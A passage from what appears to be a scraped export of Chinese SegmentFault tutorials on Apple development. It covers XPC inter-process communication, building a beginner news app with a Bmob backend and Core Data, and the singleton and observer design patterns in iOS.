[pasteboard writeObjects:@[image]];
</code></pre>

<p>因为剪贴动作太频繁了，所以要确认剪贴内容是否是你（应用）所需要得：</p>

<pre><code>NSPasteboard *pasteboard = [NSPasteboard generalPasteboard];

if ([pasteboard canReadObjectForClasses:@[[NSImage class]] options:nil]) {
    NSArray *contents = [pasteboard readObjectsForClasses:@[[NSImage class]] options: nil];
    NSImage *image = [contents firstObject];
}
</code></pre>

<h3>XPC</h3>

<p>XPC是SDK中最先进的进程间通讯技术。它架构之初的目的在于避免长时间得运行过程，来适应有限的资源，在可能运行的时候才进行初始化。把XPC纳入应用而不做任何事情的想法是不现实的，但这样提供了更好的进程间的特权分离和故障隔离。</p>

<p>XPC作为NSTask替代品甚至更多。</p>

<p>2011推出以来，XPC为OS X上的应用沙盒提供基础设施，iOS上的远程试图控制器，还有两个平台上的应用扩展。它还广范围的用在系统框架和第一方应用：</p>

<pre><code>$ find /Applications -name \*.xpc
</code></pre>

<p>控制台输入上面的命令行你会知道XPC无处不在。在一般应用中同样的情形也在发生，比如图片或者视频转变服务，系统调用，网页服务加载，或是第三方的授权。</p>

<p>XPC负责进程间通讯的同时还负责该服务生命周期的管理。包括注册服务，启动，以及通过<code>launchd</code>解决服务之间的通讯。一个XPC服务可以根据需求地洞，或者在崩溃的时候重启，或者是空闲的时候终止。正因如此，服务可以完全被设计成无状态的，以便于在运行的任何时间点的突然终止都能做到影响不大。</p>

<p>作为被iOS还有OS X中<strong>backported</strong>所采用的安全模块，XPC服务默认运行在最为严格的环境：不能访问文件，不能访问网络，没有根权限升级。任何能做的事情就是对照被赋予的白名单列表。</p>

<p>XPC可以被libxpc C API访问，或者是NSXPCConnection OC API。【注：作者会用低级API去实现（纯C）】</p>

<p>XPC服务要么存在于应用的沙盒中亦或是使用launchd调用跑在后台。</p>

<p>服务调用带事件句柄的<code>xpc_main</code>来获取新的XPC连接。</p>

<pre><code>static void connection_handler(xpc_connection_t peer) {
    xpc_connection_set_event_handler(peer, ^(xpc_object_t event) {
        peer_event_handler(peer, event);
    });

    xpc_connection_resume(peer);
}

int main(int argc, const char *argv[]) {
   xpc_main(connection_handler);
   exit(EXIT_FAILURE);
}
</code></pre>

<p>每个XPC连接是一对一的，意味着服务在不同的连接进行操作，每次调用<code>xpc_connection_create</code>就会创建一个新的链接。【注：类似BSD套接字中的API accept函数，服务在单个文件描述符进行监听来为范围内的链接创建额外描述符】：</p>

<pre><code>xpc_connection_t c = xpc_connection_create(""com.example.service"", NULL);
xpc_connection_set_event_handler(c, ^(xpc_object_t event) {
    // ...
});
xpc_connection_resume(c);
</code></pre>

<p>当一个消息发送到XPC链接，将自动的派发到一个由runtime管理的消息队列中。当链接的远端一旦开启的时候，消息将出队并被发送。</p>

<p>每个消息就是一个字典，字符串key和强类型值：</p>

<pre><code>xpc_dictionary_t message = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_uint64(message, ""foo"", 1);
xpc_connection_send_message(c, message);
xpc_release(message)
</code></pre>

<p>XPC对象对下列原始类型进行操作：</p>

<ul>
<li>Data</li>
<li>Boolean</li>
<li>Double</li>
<li>String</li>
<li>Signed Integer</li>
<li>Unsigned Integer</li>
<li>Date</li>
<li>UUID</li>
<li>Array</li>
<li>Dictionary</li>
<li>Null</li>
</ul>
<p>XPC提供了一个便捷的方法来从<code>dispatch_data_t</code>数据类型进行转换，这样从GCD到XPC的工作流程就简化了：</p>

<pre><code>void *buffer;
size_t length;
dispatch_data_t ddata =
    dispatch_data_create(buffer,
                         length,
                         DISPATCH_TARGET_QUEUE_DEFAULT,
                         DISPATCH_DATA_DESTRUCTOR_MUNMAP);

xpc_object_t xdata = xpc_data_create_with_dispatch_data(ddata);
</code></pre>

<h4>服务注册</h4>

<p>XPC可以注册成启动项任务，配置成匹配IOKit事件自动启动，BSD通知或者是<code>CFDistributedNotifications</code>。这些标准都指定在服务的<code>launchd.plist</code>文件里：<br>
.launchd.plist</p>

<pre><code>&lt;key&gt;LaunchEvents&lt;/key&gt;
&lt;dict&gt;
  &lt;key&gt;com.apple.iokit.matching&lt;/key&gt;
  &lt;dict&gt;
      &lt;key&gt;com.example.device-attach&lt;/key&gt;
      &lt;dict&gt;
          &lt;key&gt;idProduct&lt;/key&gt;
          &lt;integer&gt;2794&lt;/integer&gt;
          &lt;key&gt;idVendor&lt;/key&gt;
          &lt;integer&gt;725&lt;/integer&gt;
          &lt;key&gt;IOProviderClass&lt;/key&gt;
          &lt;string&gt;IOUSBDevice&lt;/string&gt;
          &lt;key&gt;IOMatchLaunchStream&lt;/key&gt;
          &lt;true/&gt;
          &lt;key&gt;ProcessType&lt;/key&gt;
          &lt;string&gt;Adaptive&lt;/string&gt;
      &lt;/dict&gt;
  &lt;/dict&gt;
&lt;/dict&gt;
</code></pre>

<p>最近一次对于launchd属性列表的修改是增加了<code>ProcessType</code> Key，其用来在高级层面上描述启动机构的预期目的。根据预描述行为期望，操作系统会响应调整CPU和I/O的阈值。</p>

<p><span class=""img-wrap""><img data-src=""/img/bVkgKg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<p>为了注册一个服务运行大概五分钟的时间，一套标准需要传送给<code>xpc_activity_register</code>：</p>

<pre><code>xpc_object_t criteria = xpc_dictionary_create(NULL, NULL, 0);
xpc_dictionary_set_int64(criteria, XPC_ACTIVITY_INTERVAL, 5 * 60);
xpc_dictionary_set_int64(criteria, XPC_ACTIVITY_GRACE_PERIOD, 10 * 60);

xpc_activity_register(""com.example.app.activity"",
                      criteria,
                      ^(xpc_activity_t activity)
{
    // Process Data

    xpc_activity_set_state(activity, XPC_ACTIVITY_STATE_CONTINUE);

    dispatch_async(dispatch_get_main_queue(), ^{
        // Update UI

        xpc_activity_set_state(activity, XPC_ACTIVITY_STATE_DONE);
    });
});
</code></pre>

                ", 进程间通信 (OSX/iOS),1531972165,516,1,694,1,1,https://segmentfault.com/a/1190000002400329
181,1,0,6,"
                    
<h2>一款新闻类iOS APP的诞生过程</h2>

<p><a rel=""nofollow"" href=""http://www.mexiqq.com/2014/10/11/%E4%B8%80%E6%AC%BE%E6%96%B0%E9%97%BB%E7%B1%BBiOS-APP%E7%9A%84%E8%AF%9E%E7%94%9F%E8%BF%87%E7%A8%8B/"">原文地址</a></p>

<p><strong>题外话：</strong><br>
    此篇文章以一个iOS新手的角度解释一款新闻类iOS APP诞生的过程，详细介绍在这过程中碰到的问题和我的解决思路。欢迎大家指正。</p>

<p><strong>菜单界面：</strong></p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReader-1.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p><strong>主界面：</strong></p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReader-3.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p><strong>详细页面：</strong></p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReader-2.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p><strong>关于我们页面：</strong></p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReader-4.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<h2>初期的想法</h2>

<p>具体项目背景跳过，我们着重看如何实现一款新闻类APP。</p>

<p>在开始项目计划前，我下载了大量的新闻类APP进行研究，不论是android还是iOS，充斥着大量的此类APP，比如网易新闻，一点咨询，新浪微博（暂归位新闻类），知乎，知乎日报等，然后我从零开始点开每个应用，思考它的流程以及布局和要点。发现核心不外乎以下两点：</p>

<ul>
<li>一个可以下拉刷新的tableview(即一栏一栏的视图)</li>
<li>点击每一栏可以进入一个详细的页面</li>
</ul>
<p>可是我们的应用不可能就这个样子，需要有不同的新闻模块，所以又有以下几点：</p>

<ul>
<li>两种菜单布局:<strong>底部或顶部导航栏</strong>和<strong>侧边栏（抽屉导航）</strong>
</li>
<li>除了新闻模块还要添加丰富类模块，比如我这的地图显示和校车查询（随意拓展）。</li>
</ul>
<p>当然，有了APP后我们的客户端从哪请求数据呢？于是有了以下问题：</p>

<ul>
<li>如何一个人快速开发移动端的后台，而且安全可靠</li>
</ul>
<p>OK，暂先我们只想到这，至于<strong>优化本地存储</strong>和<strong>用户友好展示</strong>等，我们后面会涉及到。</p>

<h2>开始实现</h2>

<h3>(一)绘画草图</h3>

<p>一开始我们只是个想法，即便想了很多，依然还是觉的不踏实，没有清晰的项目概念，所以我把项目的草图画了下来，如下：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/caotu.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>这下心里踏实多了，起码知道自己想让它长个什么样子了。</p>

<h3>(二)开始布局</h3>

<p>ok，草图已经有了，那想必大家已经知道我选用了流行的侧边栏(抽屉导航)布局。大家都知道盖一栋大楼最重要的是先把整栋大楼的骨架先搭起来，同样一个APP首先要做的是把自己的架构搭起来，而这就是我们的布局。</p>

<p>iOS有着众多开源的项目，这是我以前就知道的(PS:这些都是经验才能得到的，你可以通过看书，看博客，浏览官网，与大牛交流等各种渠道获取这些信息)，而对于类似我们这种侧边栏的布局，开源界有着众多的解决方案，我选用了<strong>SWRevealViewController **这套开源库，地址是：<br><a rel=""nofollow"" href=""https://github.com/John-Lluch/SWRevealViewController"">https://github.com/John-Lluch/SWRevealViewController</a> （fork: **440</strong> star: <strong>1660</strong>）</p>

<p>通过内部的示例，相信大家很快就能搭建好项目的基本骨架。这里有一个另外的小源码，希望对你掌握这块开源框架提供帮助。附链接：<a rel=""nofollow"" href=""http://mexiqq.qiniudn.com/VReaderSidebarDemo.zip"">http://mexiqq.qiniudn.com/VReaderSidebarDemo.zip</a></p>

<p>案例效果：<br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReaderSWRevealViewController.jpg"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<h3>(三)构建核心页面</h3>

<p>核心页面是一个主页面和一个详细页面：</p>

<ul>
<li>主页面当然是新闻资讯的界面，因为我们的目标是一款新闻资讯类的框架，所以页面就是一个新闻的列表。自然而然我们用了一个UItableView作为主页面的控件。</li>
<li>详细页面是展示详细新闻内容的页面，暂时我们不考虑复杂的涉及，只需要在里面放置一textview</li>
<li>通过segue将主页面和详细页面联系起来，实现跳转和消息传递<strong>(基础)</strong>
</li>
</ul>
<p>OK，核心界面有了（PS：我这里使用的是Xcode的storboard构建页面,不使用旧式的xib）</p>

<p>效果如下：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReaderCorePage.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<h3>(四)构建服务器</h3>

<p>终于到了这个移动开发人员头疼的问题了，由于项目需要，我们必须有可以提供数据的接口，对于前端移动开发人员来说如果可以自己构建后台无疑减少了大量的沟通问题，然而人的精力有限，无法同时兼顾，咋么办？</p>

<p>OK，现在这个问题得到了不错的解决，越来越多的云服务开始出现，小编今天给大家推荐一款移动端后台开发平台Bomb（当然同类型的不少，不如facebook的Parse,不过国内大家都懂的），它提供了一套后台开发所使用的SDK，方便的为你的前端产品搭建后台，适合中小企业或者独立开发者使用。</p>

<p>附官方链接：<a rel=""nofollow"" href=""http://www.bmob.cn/"">http://www.bmob.cn/</a><br>
附我的推荐链接：<br><a rel=""nofollow"" href=""http://www.mexiqq.com/2014/09/09/Bomb%E4%BA%91%E6%9C%8D%E5%8A%A1%E4%BB%8B%E7%BB%8D%E6%8A%95%E7%A5%A8/"">http://www.mexiqq.com/2014/09/09/Bomb%E4%BA%91%E6%9C%8D%E5%8A%A1%E4%BB%8B%E7%BB%8D%E6%8A%95%E7%A5%A8/</a></p>

<p>给出我的平台数据库图片：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReaderbomb.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>如图所示我的云端数据库有<strong>7</strong>个表，<strong>User</strong>是用户的注册表，由Bomb自动帮我们建立，因为我们是简单的新闻资讯类APP，所以未使用。接下来有四个<strong>module</strong>表，分别对应我新闻内容的四个模块（我添加了title,publishTime,content三个字段）。<strong>GameScore</strong>暂时未用。<strong>Question</strong>用于用户提交问题反馈的表（我添加了Question 和 Reply两个字段）。</p>

<p>OK，对于一个简单的新闻咨询类APP这个后台我想已经足够了。</p>

<h3>(五)连接后台与前端</h3>

<p>虽然这里用不着，但我说些题外话，在iOS开发中，对于web service的访问是重中之重，主要涉及以下三个方面：</p>

<ul>
<li>Json数据格式的解析：iOS SDK自带了最快的解析方式</li>
<li>访问web Service：推介使用第三方的开源库（ASIHTTPRequest,AFNetworking,<strong>MKNetworkKit</strong>）</li>
<li>定位服务与地图应用</li>
</ul>
<p>上面的看起来对于初学者有些恐怖，不过好消息是Bomb提供了封装好的SDK，使用自带的BombQuery去查询数据库。现面给出我的一个例子：<br>
(PS:在使用之前记得将应用秘钥加入项目，方法见Bomb官网)</p>

<pre><code> //请求数据
    BmobQuery   *bquery = [BmobQuery queryWithClassName:module];
    [bquery selectKeys:@[@""title"",@""publishTime""]];
    [bquery setLimit:15];
    [bquery orderByDescending:@""createdAt""];
    [bquery findObjectsInBackgroundWithBlock:^(NSArray *array, NSError *error) {
        if(!error){
            local = false;（步骤1）
            myarray = array;（步骤2）
            [NSThread detachNewThreadSelector:@selector(saveContent:) toTarget:self withObject:array];（步骤3）
            [self performSelector:@selector(reloadData) withObject:nil afterDelay:0];（步骤4）
        }else{
            [self.refreshControl endRefreshing];
            UIAlertView *alertView = [[UIAlertView alloc]
                                      initWithTitle:@""友情提示""
                                      message:@""无法获取数据，请检查网络(☆_☆)""
                                      delegate:self cancelButtonTitle:@""关闭""
                                      otherButtonTitles:nil, nil];
            [alertView show];
        }
    }];
</code></pre>

<p>上述例子查询了数据库的15条例子，采用异步访问的方式返回数据。发生错误时给出提示，如果成功，会有四步操作：</p>

<ul>
<li>步骤一我指定一个bool值，表示数据非本地存储</li>
<li>步骤二我将新加载的数据赋值给tableview绑定的数据</li>
<li>步骤三开启一个线程，将新加载的数据本地化</li>
<li>步骤四跳转到执行更新列表的方法</li>
</ul>
<p>后面会详细涉及到数据持久话操作，在这里我们不必细究。<br>
OK,我们使用Bomb自己提供的查询方法访问Bomb服务，成功的将应用与服务器连接起来。</p>

<p>这是我访问数据后展示新闻列表的页面：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReader-3.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<h3>(六)基本的业务逻辑</h3>

<p>OK，其实我们几乎不涉及业务逻辑，因为我们只是把最新的新闻数据展示给用户看，不过仍然有一些逻辑需要我们注意：</p>

<ul>
<li>用户如何获取最新的消息: <strong>下拉刷新</strong>
</li>
<li>用户想保存一条新闻消息到本地: <strong>我的收藏</strong>
</li>
<li>用户发现问题咋么办: <strong>消息反馈</strong>
</li>
</ul>
<p>解决方案：</p>

<ul>
<li>iOS sdk自带了下拉刷新的解决方案<strong>refreshControl</strong>  </li>
</ul>
<p>示例代码：</p>

<pre><code>self.refreshControl = [[UIRefreshControl alloc] init];
self.refreshControl.backgroundColor = [UIColor lightGrayColor];
self.refreshControl.tintColor = [UIColor whiteColor];
[self.refreshControl addTarget:self
                        action:@selector(getLatestLoans)
              forControlEvents:UIControlEventValueChanged];
</code></pre>

<p>效果图案：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReaderrefreshCrl.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span><br>
(PS:以上代码和示例只是用于展示，不推荐直接使用，建议先找几篇文章系统学习以下)</p>

<ul>
<li>使用CoreData保存用户想要保存的信息</li>
</ul>
<p>在这里我推荐两篇教程，很简明的讲述了Core Data的基本使用，附链接：</p>

<p><a rel=""nofollow"" href=""http://www.appcoda.com/introduction-to-core-data/"">http://www.appcoda.com/introduction-to-core-data/</a><br><a rel=""nofollow"" href=""http://www.appcoda.com/core-data-tutorial-update-delete/"">http://www.appcoda.com/core-data-tutorial-update-delete/</a></p>

<p>再给出我处理<strong>保存动作</strong>时执行的代码:</p>

<pre><code>- (IBAction)saveNews:(id)sender {
NSManagedObjectContext *managedObjectContext = [self managedObjectContext];
NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] initWithEntityName:@""CollectionNews""];
NSPredicate *predicate = [NSPredicate predicateWithFormat: @""newsTitle == %@"",titleName];
[fetchRequest setPredicate:predicate];
NSArray *news = [[managedObjectContext executeFetchRequest:fetchRequest error:nil] mutableCopy];

    if (news.count == 0) {
        NSManagedObject *newRecentlyNews = [NSEntityDescription insertNewObjectForEntityForName:@""CollectionNews"" inManagedObjectContext:managedObjectContext];
        [newRecentlyNews setValue:titleName forKey:@""newsTitle""];
        [newRecentlyNews setValue:publishTime forKey:@""newsPublishTime""];
        [newRecentlyNews setValue:newsContent.text forKey:@""newsContent""];
        //[newRecentlyNews setValue:[obj objectForKey:@""playerName""] forKey:@""newsContent""];
        NSError *error = nil;
        if (![managedObjectContext save:&amp;error]) {
            UIAlertView *alertView = [[UIAlertView alloc]
                                      initWithTitle:@""友情提示""
                                      message:@""发生意外(☆_☆)""
                                      delegate:self cancelButtonTitle:@""关闭""
                                      otherButtonTitles:nil, nil];
            [alertView show];
        }else{
            UIAlertView *alertView = [[UIAlertView alloc]
                                      initWithTitle:@""友情提示""
                                      message:@""保存成功Y(^_^)Y""
                                      delegate:self cancelButtonTitle:@""关闭""
                                      otherButtonTitles:nil, nil];
            [alertView show];

        }
    }else{
        UIAlertView *alertView = [[UIAlertView alloc]
                                  initWithTitle:@""友情提示""
                                  message:@""重复保存哦，亲(☆_☆)""
                                  delegate:self cancelButtonTitle:@""关闭""
                                  otherButtonTitles:nil, nil];
        [alertView show];
    }
}
</code></pre>

<p>首先查询表中有无重复的信息，如果有提示重复保存，如果没有则新建一个NSManageObject保存信息。</p>

<p>效果图：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReadersaveSuccess.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span><br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReadersaveFail.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span><br>
- 使用Bomb提供的服务提交问题到Question表</p>

<p>Bomb不仅给我提供了查询的API，同样提供了增删改查一整套API，所以我们能使用Bomb提供的服务将用户的问题进行提交，给出我的代码和运行效果:</p>

<pre><code>- (IBAction)submitQuestion:(id)sender {
    if(![_myQuestion.text isEqualToString:@""在此输入：""]){
        BmobObject *gameScore = [BmobObject objectWithClassName:@""Questions""];
        [gameScore setObject:_myQuestion.text forKey:@""question""];
        [gameScore saveInBackgroundWithResultBlock:^(BOOL isSuccessful, NSError *error) {
            //进行操作
            if(error ==nil){
                UIAlertView *alertView = [[UIAlertView alloc]
                                          initWithTitle:@""友情提示""
                                          message:@""提交成功Y(^_^)Y""
                                          delegate:self cancelButtonTitle:@""关闭""
                                          otherButtonTitles:nil, nil];
                [alertView show];

            }else{
                UIAlertView *alertView = [[UIAlertView alloc]
                                          initWithTitle:@""友情提示""
                                          message:@""提交失败，请检查网络(☆_☆)""
                                          delegate:self cancelButtonTitle:@""关闭""
                                          otherButtonTitles:nil, nil];
                [alertView show];

            }
        }];
    }else{

        UIAlertView *alertView = [[UIAlertView alloc]
                                  initWithTitle:@""友情提示""
                                  message:@""请输入有效文字(☆_☆)""
                                  delegate:self cancelButtonTitle:@""关闭""
                                  otherButtonTitles:nil, nil];
        [alertView show];

    }
}
</code></pre>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReaderquestionSuccess.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span><br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/VReaderquestionFail.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<h3>(七)优化用户体验</h3>

<p>我们本着主要功能去优化用户的体验，我想到以下两点，其实也是最基本的两点：</p>

<ul>
<li>当用户进入详细页面后加载数据期间，如何显示才能不让用户觉得突兀？</li>
<li>用户访问过一次数据之后，再进入到此详细页面时难道要再访问一次后台吗？</li>
</ul>
<p>好伐，以上两点应该是我们应用中用户体验感最强的两点，下面给出我的解决思路：</p>

<ul>
<li>
<p>对于需要用户等待的时间段内我会展示一个旋转的进度条，告诉用户我在加载数据，这个进度条可以使用iOS 提供的<strong>UIActivityIndicatorView</strong>类，只需要通过以下三行代码即可改善用户体验:</p>

<pre><code>[myprogress setHidesWhenStopped:YES];//设置进度条停止时隐藏
[myprogress startAnimating];//设置进度条开始旋转
[myprogress stopAnimating];//设置进度条停止旋转
</code></pre>
</li>
</ul>
<p>只需要在加载前设置进度条开始旋转，异步加载完数据后设置进度条停止旋转即可。</p>

<ul>
<li>对于第二点，很自然就想到了数据持久化。当用户访问完某条新闻内容时，将数据内容本地化，下一次访问时直接从本地获取，无需延迟。同样，我使用core data进行数据存储。</li>
</ul>
<p>代码如下：</p>

<pre><code>-(BOOL)isLocalData{
    //NSLog(@""titlename%@"",titleName);
    NSManagedObjectContext *managedObjectContext = [self managedObjectContext];
    NSFetchRequest *fetchRequest = [[NSFetchRequest alloc] initWithEntityName:myEntimty];
    NSPredicate *predicate = [NSPredicate predicateWithFormat: @""newsTitle == %@"",titleName];
    [fetchRequest setPredicate:predicate];

    NSArray *news = [[managedObjectContext executeFetchRequest:fetchRequest error:nil] mutableCopy];
    if(news.count &gt; 0)
    {
        NSManagedObject *entiy = [news objectAtIndex:0];
        if(![entiy valueForKey:@""newsContent""]){
            return false;
        }else{
            [newsContent setText:[entiy valueForKey:@""newsContent""]];
            [self changeFrameSizeOfTextView];
            return true;
        }
    }
    return false;
}
</code></pre>

<p>上述代码在用户进入详细页面后执行，检测本地是否已经拥有此条新闻内容，如果已经存在，则从本地获取，若不存在，则远程获取数据。（PS：由于我本地最多存取15条新闻，每次刷新时会清空原先的数据，所以直接通过新闻标题查取，不推荐）</p>

<h3>(八)丰富功能模块</h3>

<p>OK，经过以上七步，基本已经搭建起一个简单的新闻类APP了，但是我们的应用会不会太单调了呢？我们可以给自己的应用增加一些额外的模块，具体选择什么要视自己的情况。这里因为是给学校做了一个就业信息发布的APP，所以添加了校车查询，地图显示的富类模块。</p>

<h3>(九)开源</h3>

<p><a rel=""nofollow"" href=""https://github.com/mexiQQ/VReader-iOS.git"">https://github.com/mexiQQ/VReader-iOS.git</a></p>

<p>欢迎各位大牛们指点一二 Y(^_^)Y</p>

                ", 一款新闻类iOS APP的诞生过程(初学),1531972166,491,1,922,1,1,https://segmentfault.com/a/1190000002220355
182,1,0,6,"
                    
<h1>iOS开发——设计模式那点事 <a rel=""nofollow"" href=""http://www.mexiqq.com/2014/10/18/iOS-%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/"">原文地址</a>
</h1>

<p>题外话：说起设计模式，感觉自己把握不了笔头，所以单拿出iOS开发中的几种常用设计模式谈一下</p>

<h2>单例模式(Singleton)</h2>

<p>概念：整个应用或系统只能有该类的一个实例</p>

<p>在iOS开发我们经常碰到只需要某类一个实例的情况，最常见的莫过于对硬件参数的访问类，比如UIAccelerometer.这个类可以帮助我们获得硬件在各个方向轴上的加速度，但是我们仅仅需要它的一个实例就够了，再多，只会浪费内存。</p>

<p>所以苹果提供了一个UIAccelerometer的实例化方法＋sharedAccelerometer,从名字上我们也能看出此方法让整个应用共享一个UIAccelerometer实例（PS：iOS 的开放中，我们往往能从方法名中就了解这个方法的作用），它内部的如何实现我们暂且不谈，先来看看还有哪些类同样使用了单例模式。</p>

<ul>
<li>UIApplication类提供了 ＋sharedAPplication方法创建和获取UIApplication单例</li>
<li>NSBundle类提供了 +mainBunle方法获取NSBundle单例</li>
<li>NSFileManager类提供了 ＋defaultManager方法创建和获得NSFileManager单例。（PS：有些时候我们得放弃使用单例模式，使用－init方法去实现一个新的实例，比如使用委托时）</li>
<li>NSNotificationCenter提供了 ＋defaultCenter方法创建和获取NSNotificationCenter单例（PS：该类还遵循了另一个重要的设计模式：观察者模式）</li>
<li>NSUserDefaults类提供了 ＋defaultUserDefaults方法去创建和获取NSUserDefaults单例</li>
</ul>
<p>等等，苹果的SDK中大量的遵循此设计模式，那么它的内部是如何实现的呢？</p>

<p>首先给大家介绍一下GCD技术，是苹果针对于多核CPU的多任务解决方案。你不需要了解更多，只需要知道是一组基于C语言开发的API（详细内容可以看一下唐巧前辈的这篇博文：<a rel=""nofollow"" href=""http://blog.devtang.com/blog/2012/02/22/use-gcd/"">http://blog.devtang.com/blog/2012/02/22/use-gcd/</a> ）。GCD提供了一个dispatch_once函数，这个函数的作用就是保证block（代码块：暂时理解为一个跟函数相近的东西，具体可以参照这篇文章：<a rel=""nofollow"" href=""http://blog.csdn.net/enuola/article/details/8674063"">http://blog.csdn.net/enuola/article/details/8674063</a> ）里的语句在整个应用的生命周期里只执行一次。</p>

<p>OK，接下来就给出一个使用了单例模式新建和获取实例的类模版，代码如下：</p>

<pre><code>//Singleton.h
@interface Singleton : NSObject
+ (Singleton *)sharedSingleton; &lt;1&gt;
@end

/***************************************************************/

//Singleton.m
#import ""Singleton.h""
@implementation Singleton   
static Singleton *sharedSingleton = nil;&lt;2&gt;

+ (Singleton *)sharedSingleton{
    static dispatch_once_t once;&lt;3&gt;
    dispatch_once(&amp;once,^{
        sharedSingleton = [[self alloc] init];&lt;4&gt;
        //dosometing
    });
    return sharedSingleton;&lt;5&gt;
}
</code></pre>

<p>上述代码中有5小步，解释如下：</p>

<ul>
<li>声明一个可以新建和获取单个实例对象的方法</li>
<li>声明一个static类型的类变量</li>
<li>声明一个只执行一次的任务</li>
<li>调用dispatch_once执行该任务指定的代码块，在该代码块中实例化上文声明的类变量</li>
<li>返回在整个应用的生命周期中只会被实例化一次的变量</li>
</ul>
<hr>
<p>OK，这就是iOS开发中单例模式的机制，下面我们就看看如何在实际开发中使用此模式？（PS：为了尽可能的突出核心内容，我们会对设计中的其他模式或内容一笔带过）</p>

<p>假如我们需要在iOS应用中实现分层的架构设计，即我们需要把数据的持久层，展示层，和逻辑层分开。为了突出重点，我们直接把目光转到持久层，而根据MVC的设计模式，我们又可以把持久层细分为DAO层（放置访问数据对象的四类方法）和Domain层（各种实体类，比如学生），这样就可以使用DAO层中的方法，配合实体类Domain层对数据进行清晰的增删改查。那么我们如何设计呢？</p>

<p>从使用者的角度看，我们期望获得DAO层的类实例，然后调用它的增删改查四大方法。可是这个类实例，我们似乎只需要一个就足够了，再多的话不利于管理且浪费内存。OK，我们可以使用单例模式了，代码如下：<br>
.h文件：</p>

<pre><code>//StudentDAO.h
@interface StudentDAO:NSObject
@property (nonatomic,strong) NSMutaleArray *StudentsInfo;

+ (StudentDAO *)sharedStudentDAO;

-(int) create:(Student*)student;
-(int) remove:(Student*)student;
-(int) modify:(Student*)student;
-(NSMutaleArray) findAll;
@end
</code></pre>

<p>.m文件：</p>

<pre><code>//StudentDAO.m
#import ""StudentDAO.h""
#import ""Student.h""
@implementation StudentDAO

static StudentDAO *studentDao = nil;
+ (StudentDAO)sharedStudentDAO{
    static dispatch_once_t once;
    dispatch_once(&amp;once,^{
        Student  *student1 = [[Student alloc]init];
        student1.name = ""MexiQQ"";
        student1.studentNum = ""201200301101"";

        Student  *student2 = [[Student alloc]init];
        student2.name = ""Ricardo_LI"";
        student2.studentNum = ""201200301102"";

        studentDao = [[self alloc] init];
        studentDao._StudentsInfo = [[NSMutaleArray alloc]init];
        [studentDao._StudentsInfo addObject:student1];
        [studentDao._StudentsInfo addObject:student2];
    });
    return studentDao;
}   
//插入的方法
-(int)create:(Student*)stu{
    [self._StudentsInfo addObject:stu];
    return 0;
}   
//删除的方法
-(int)remove:(Student*)stu{
    for(Student* s in self._StudentsInfo){
        if([stu.studentNum isEqual:s.studentNum]){
            [self._StudentsInfo removeObject:s]
            break;
        }
    }
}
-(int)modify...... //省略不写
-(NSMutaleArray)findAll...... //省略不写
</code></pre>

<p>上述例子不难理解，其中用到的Student类我这里就不给出了，只是一个含有姓名和学号属性的实体类。</p>

<h2>观察者模式</h2>

<p>概念：一个对象状态改变，通知正在对他进行观察的对象，这些对象根据各自要求做出相应的改变</p>

<p>图例：</p>

<p><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/observer.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>如图所示：操作对象向被观察者对象投送消息，使得被观察者的状态得以改变，在此之前已经有观察者向被观察对象注册，订阅它的广播，现在被观察对象将自己状态发生改变的消息广播出来，观察者接收到消息各自做出应变。</p>

<p>OK，我们先来看看在苹果的Cocoa Touch框架中有谁使用了观察者模式：</p>

<h3>通知(notification)机制</h3>

<p>原理图如下：<br><span class=""img-wrap""><img data-src=""http://mexiqq.qiniudn.com/notification.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

